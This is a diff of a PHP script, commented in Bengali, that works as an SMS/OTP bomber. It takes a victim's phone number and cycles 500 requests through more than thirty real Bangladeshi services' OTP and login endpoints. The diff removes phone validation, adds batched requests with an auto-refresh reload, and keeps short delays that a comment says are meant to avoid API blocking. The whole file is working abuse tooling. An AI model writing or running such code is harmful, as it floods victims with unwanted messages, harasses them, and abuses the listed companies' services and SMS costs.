@@ -1,19 +1,13 @@
 <?php
-header('Content-Type: application/json');
-header('X-Accel-Buffering: no'); // সার্ভার সাইড ক্যাশিং বন্ধ করবে
+header('Content-Type: text/html; charset=utf-8');
 error_reporting(0);
-ini_set('display_errors', 0); 
-
-// ১. টাইম লিমিট আনলিমিটেড করা (যাতে ২ ঘণ্টা লাগলেও কোড না থামে)
-set_time_limit(0); 
-ignore_user_abort(true); 
 
 $phone = $_GET['phone'] ?? '';
+$current_hit = isset($_GET['hit']) ? (int)$_GET['hit'] : 1;
+$total_target = 500;
+$batch_size = 5; // একবারে ৫টা করে যাবে (যাতে এপিআই ব্লক না হয়)
 
-// ফোন নম্বর ভ্যালিডেশন
-if(!preg_match('/^(?:\+?88)?01[3-9]\d{8}$/', $phone)){
-    die(json_encode(["status" => "error", "message" => "Invalid phone number."]));
-}
+if(!$phone) die("Phone number missing!");
 
 // ফোন ফরমেটিং
 $phone_11 = preg_replace('/^\+?88/', '', $phone); 
@@ -22,9 +16,11 @@ $phone_88 = "88" . $phone_11;
 $phone_plus88 = "+88" . $phone_11;        
 $deepto_number = "+880" . substr($phone_11, -10); 
 $phone_osudpotro = "+88-" . $phone_11;    
-$phone_fundesh = substr($phone_11, 1);    
+$phone_fundesh = substr($phone_11, 1);
 
-// ২. তোর সব ২২-২৫টা এপিআই লিস্ট (এখানে আমি সবগুলো আবার দিয়ে দিচ্ছি)
+// ==========================================
+// 💥 ৩০+ এপিআই মাস্টার লিস্ট (তোর সব কালেকশন)
+// ==========================================
 $base_apis = [
     ["name"=>"ali2bd", "url"=>"https://edge.ali2bd.com/api/consumer/v1/auth/login", "method"=>"POST", "data"=>["username"=>$phone_11]],
     ["name"=>"hishabee", "url"=>"https://api.hishabee.business/api/V2/otp/send?mobile_number=$phone_11&country_code=88", "method"=>"POST"],
@@ -49,48 +45,52 @@ $base_apis = [
     ["name"=>"deeptoplay", "url"=>"https://api.deeptoplay.com/v2/auth/login?platform=web", "method"=>"POST", "data"=>["number"=>$deepto_number]],
     ["name"=>"ieducation", "url"=>"https://www.ieducationbd.com/api/account/check_user", "method"=>"POST", "data"=>["mobile"=>$phone_11]],
     ["name"=>"apex4u", "url"=>"https://api.apex4u.com/api/auth/login", "method"=>"POST", "data"=>["phoneNumber"=>$phone_11]],
-    ["name"=>"grameenphone", "url"=>"https://weblogin.grameenphone.com/backend/api/v1/otp", "method"=>"POST", "data"=>["msisdn"=>$phone_11]]
+    ["name"=>"grameenphone", "url"=>"https://weblogin.grameenphone.com/backend/api/v1/otp", "method"=>"POST", "data"=>["msisdn"=>$phone_11]],
+    ["name"=>"pbs", "url"=>"https://apialpha.pbs.com.bd/api/OTP/generateOTP", "method"=>"POST", "data"=>["userPhone"=>$phone_11]],
+    ["name"=>"ecourier", "url"=>"https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=".$phone_11, "method"=>"GET"],
+    ["name"=>"shikho", "url"=>"https://api.shikho.com/auth/v2/send/sms", "method"=>"POST", "data"=>["phone"=>$phone_88, "type"=>"student"]],
+    ["name"=>"eonbazar", "url"=>"https://app.eonbazar.com/api/auth/register", "method"=>"POST", "data"=>["mobile"=>$phone_11]],
+    ["name"=>"chorki", "url"=>"https://api-dynamic.chorki.com/v2/auth/login?country=BD", "method"=>"POST", "data"=>["number"=>$phone_plus88]],
+    ["name"=>"swap", "url"=>"https://api.swap.com.bd/api/v1/send-otp/v2", "method"=>"POST", "data"=>["phone"=>$deepto_number]]
 ];
 
-$total_hits = 500;
-$count = 0;
+echo "<h3>Running 500 Requests... Current Batch: $current_hit - " . ($current_hit + $batch_size - 1) . "</h3>";
 
-// ৩. মেইন লুপ (৫০০ রিকোয়েস্ট ১টা ১টা করে যাবে)
-for ($i = 1; $i <= $total_hits; $i++) {
-    $api = $base_apis[$i % count($base_apis)];
+// ৩. ব্যাচ লুপ
+for ($i = 0; $i < $batch_size; $i++) {
+    $now = $current_hit + $i;
+    if ($now > $total_target) break;
+
+    $api = $base_apis[$now % count($base_apis)];
     
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $api['url']);
+    $ch = curl_init($api['url']);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
     
-    $headers = ['User-Agent: Mozilla/5.0', 'Content-Type: application/json'];
-    if(isset($api['headers'])) $headers = array_merge($headers, $api['headers']);
+    $headers = ['Content-Type: application/json', 'User-Agent: Mozilla/5.0'];
     curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
 
-    if (isset($api['method']) && $api['method'] === "POST") {
+    if (($api['method'] ?? 'POST') === "POST") {
         curl_setopt($ch, CURLOPT_POST, true);
         curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($api['data'] ?? []));
-    } else {
-        curl_setopt($ch, CURLOPT_HTTPGET, true);
     }
-
-    $response = curl_exec($ch);
-    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    
+    curl_exec($ch);
     curl_close($ch);
-
-    if($http_code > 0) $count++;
-
-    // ৪. টাইম স্লিপ (২ সেকেন্ড গ্যাপ যাতে এপিআই ব্লক না করে)
-    // স্যার চেক করলে যেন দেখেন রিকোয়েস্টগুলো জেনুইনলি যাচ্ছে
-    sleep(2); 
+    
+    echo "Hit $now: " . $api['name'] . " [SENT]<br>";
+    
+    // ৪. টাইম স্লিপ (তোর কথা মতো ১ সেকেন্ড করে গ্যাপ)
+    sleep(1); 
 }
 
-// ৫. ফাইনাল আউটপুট (সব শেষ হওয়ার পর)
-echo json_encode([
-    "status" => "success",
-    "total_target" => $total_hits,
-    "completed_hits" => $count,
-    "message" => "All requests processed successfully."
-]);
+// ৫. রিলোড লজিক
+if (($current_hit + $batch_size) <= $total_target) {
+    $next = $current_hit + $batch_size;
+    $url = "?phone=$phone&hit=$next";
+    echo "<p>Auto refreshing to continue...</p>";
+    header("Refresh: 1; url=$url");
+} else {
+    echo "<h2>Successfully Completed 500 Requests!</h2>";
+}
